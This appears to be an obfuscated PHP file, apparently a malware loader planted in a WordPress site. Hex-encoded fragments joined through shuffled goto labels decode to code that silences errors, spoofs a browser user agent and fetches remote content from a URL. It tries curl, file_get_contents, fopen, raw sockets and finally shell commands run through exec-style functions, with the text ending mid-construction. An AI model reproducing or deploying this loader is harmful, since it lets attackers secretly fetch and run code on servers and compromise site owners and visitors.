<?php
error_reporting(0);
$jklfm=''; goto _697E0827C2CDD;
_697E0827C2D73: $jklfm.="\x50\x5f\x55\x53\x45\x5f\x54\x48\x45\x4d\x45\x53"; goto _697E0827C2D74;
_697E0827C2D29: $jklfm.="\x41\x67\x65\x6e\x74\x3a\x24\x75\x61\x5c\x72\x5c"; goto _697E0827C2D2A;
_697E0827C2CE6: $jklfm.="\x5f\x73\x65\x74\x28\x27\x64\x69\x73\x70\x6c\x61"; goto _697E0827C2CE8;
_697E0827C2CEF: $jklfm.="\x3b\x20\x41\x6e\x64\x72\x6f\x69\x64\x20\x31\x30"; goto _697E0827C2CF0;
_697E0827C2D05: $jklfm.="\x5f\x67\x65\x74\x28\x27\x61\x6c\x6c\x6f\x77\x5f"; goto _697E0827C2D06;
_697E0827C2CEE: $jklfm.="\x61\x2f\x35\x2e\x30\x20\x28\x4c\x69\x6e\x75\x78"; goto _697E0827C2CEF;
_697E0827C2CF7: $jklfm.="\x0a\x24\x63\x3d\x27\x27\x3b\x0d\x0a\x69\x66\x28"; goto _697E0827C2CF8;
_697E0827C2D6D: $jklfm.="\x78\x42\x42\x5c\x78\x42\x46\x2f\x27\x2c\x27\x27"; goto _697E0827C2D6E;
_697E0827C2D2A: $jklfm.="\x6e\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a"; goto _697E0827C2D2B;
_697E0827C2D21: $jklfm.="\x70\x5b\x27\x68\x6f\x73\x74\x27\x5d\x2c\x38\x30"; goto _697E0827C2D22;
_697E0827C2D30: $jklfm.="\x73\x65\x28\x24\x66\x29\x3b\x24\x63\x3d\x65\x78"; goto _697E0827C2D31;
_697E0827C2D4C: $jklfm.="\x6c\x73\x65\x69\x66\x28\x24\x66\x3d\x3d\x27\x70"; goto _697E0827C2D4D;
_697E0827C2CDD: $jklfm.="\x40\x65\x72\x72\x6f\x72\x5f\x72\x65\x70\x6f\x72"; goto _697E0827C2CE5;
_697E0827C2CFB: $jklfm.="\x6c\x5f\x69\x6e\x69\x74\x28\x24\x75\x29\x3b\x63"; goto _697E0827C2CFC;
_697E0827C2D07: $jklfm.="\x7b\x24\x78\x3d\x73\x74\x72\x65\x61\x6d\x5f\x63"; goto _697E0827C2D08;
_697E0827C2D01: $jklfm.="\x29\x3b\x24\x63\x3d\x63\x75\x72\x6c\x5f\x65\x78"; goto _697E0827C2D02;
_697E0827C2CF1: $jklfm.="\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20"; goto _697E0827C2CF2;
_697E0827C2D1D: $jklfm.="\x73\x28\x27\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e"; goto _697E0827C2D1E;
_697E0827C2D0F: $jklfm.="\x74\x65\x6e\x74\x73\x28\x24\x75\x2c\x30\x2c\x24"; goto _697E0827C2D10;
_697E0827C2D5E: $jklfm.="\x3d\x40\x73\x74\x72\x65\x61\x6d\x5f\x67\x65\x74"; goto _697E0827C2D5F;
_697E0827C2D6A: $jklfm.="\x7d\x7d\x7d\x0d\x0a\x69\x66\x28\x24\x63\x29\x7b"; goto _697E0827C2D6B;
_697E0827C2D08: $jklfm.="\x6f\x6e\x74\x65\x78\x74\x5f\x63\x72\x65\x61\x74"; goto _697E0827C2D09;
_697E0827C2CE9: $jklfm.="\x3b\x0d\x0a\x24\x75\x3d\x27\x68\x74\x74\x70\x73"; goto _697E0827C2CEA;
_697E0827C2D14: $jklfm.="\x6e\x28\x24\x75\x2c\x27\x72\x27\x29\x3b\x69\x66"; goto _697E0827C2D15;
_697E0827C2D4F: $jklfm.="\x27\x29\x3b\x69\x66\x28\x24\x68\x29\x7b\x24\x63"; goto _697E0827C2D5E;
_697E0827C2D04: $jklfm.="\x0a\x69\x66\x28\x21\x24\x63\x26\x26\x69\x6e\x69"; goto _697E0827C2D05;
_697E0827C2D1F: $jklfm.="\x5f\x75\x72\x6c\x28\x24\x75\x29\x3b\x24\x66\x3d"; goto _697E0827C2D20;
_697E0827C2D11: $jklfm.="\x26\x26\x66\x75\x6e\x63\x74\x69\x6f\x6e\x5f\x65"; goto _697E0827C2D12;
_697E0827C2D3A: $jklfm.="\x20\x31\x35\x20\x2d\x4f\x20\x2d\x20\x24\x75\x22"; goto _697E0827C2D3B;
_697E0827C2D34: $jklfm.="\x28\x21\x24\x63\x29\x7b\x24\x63\x6d\x64\x3d\x22"; goto _697E0827C2D35;
_697E0827C2D18: $jklfm.="\x74\x72\x65\x61\x6d\x5f\x67\x65\x74\x5f\x63\x6f"; goto _697E0827C2D19;
_697E0827C2D02: $jklfm.="\x65\x63\x28\x24\x68\x29\x3b\x63\x75\x72\x6c\x5f"; goto _697E0827C2D03;
_697E0827C2D20: $jklfm.="\x40\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e\x28\x24"; goto _697E0827C2D21;
_697E0827C2D3F: $jklfm.="\x65\x61\x63\x68\x28\x5b\x27\x73\x68\x65\x6c\x6c"; goto _697E0827C2D40;
_697E0827C2D35: $jklfm.="\x63\x75\x72\x6c\x20\x2d\x73\x4c\x20\x2d\x41\x20"; goto _697E0827C2D36;
_697E0827C2D3B: $jklfm.="\x3b\x24\x64\x3d\x73\x74\x72\x74\x6f\x6c\x6f\x77"; goto _697E0827C2D3C;
_697E0827C2CFF: $jklfm.="\x34\x32\x3d\x3e\x30\x2c\x31\x30\x30\x31\x38\x3d"; goto _697E0827C2D00;
_697E0827C2D22: $jklfm.="\x2c\x24\x65\x2c\x24\x72\x2c\x31\x35\x29\x3b\x69"; goto _697E0827C2D23;
_697E0827C2D2C: $jklfm.="\x6e\x22\x29\x3b\x24\x62\x3d\x27\x27\x3b\x77\x68"; goto _697E0827C2D2D;
_697E0827C2D17: $jklfm.="\x24\x68\x2c\x31\x35\x29\x3b\x24\x63\x3d\x40\x73"; goto _697E0827C2D18;
_697E0827C2D45: $jklfm.="\x65\x78\x69\x73\x74\x73\x28\x24\x66\x29\x26\x26"; goto _697E0827C2D46;
_697E0827C2D5F: $jklfm.="\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x28\x24\x68"; goto _697E0827C2D60;
_697E0827C2D49: $jklfm.="\x29\x7b\x40\x65\x78\x65\x63\x28\x24\x63\x6d\x64"; goto _697E0827C2D4A;
_697E0827C2CFD: $jklfm.="\x72\x72\x61\x79\x28\x24\x68\x2c\x5b\x31\x39\x39"; goto _697E0827C2CFE;
_697E0827C2CED: $jklfm.="\x0a\x24\x75\x61\x3d\x27\x4d\x6f\x7a\x69\x6c\x6c"; goto _697E0827C2CEE;
_697E0827C2D42: $jklfm.="\x6d\x27\x2c\x27\x65\x78\x65\x63\x27\x2c\x27\x70"; goto _697E0827C2D43;
